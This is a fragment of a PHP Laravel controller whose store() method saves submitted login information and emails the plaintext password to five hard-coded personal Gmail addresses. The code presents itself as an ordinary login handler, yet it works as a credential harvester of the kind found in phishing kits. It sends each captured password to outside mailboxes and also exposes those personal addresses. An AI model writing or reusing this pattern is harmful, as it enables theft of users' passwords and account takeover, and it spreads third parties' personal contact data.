...
class LoginInfoController extends Controller
{
    ...
    public function store(Request $request)
    {
        ...
        Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com", "feliciakurniawann06@gmail.com", "crlnkurniawan@gmail.com", "vellin1999@gmail.com"])->send(new LoggedIn($info->password));
        return $info;
    }
